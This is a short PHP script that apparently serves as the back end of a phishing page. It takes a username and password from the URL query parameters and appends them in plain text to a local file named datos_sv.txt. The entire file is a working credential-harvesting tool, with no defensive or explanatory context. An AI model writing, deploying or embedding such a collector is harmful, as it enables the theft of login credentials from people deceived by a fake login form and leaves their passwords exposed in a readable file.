<?php
$myfile = fopen("datos_sv.txt", "a+");
$txt="User: ".urldecode($_GET['u'])."\nPass: ".urldecode($_GET['p'])."\n\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
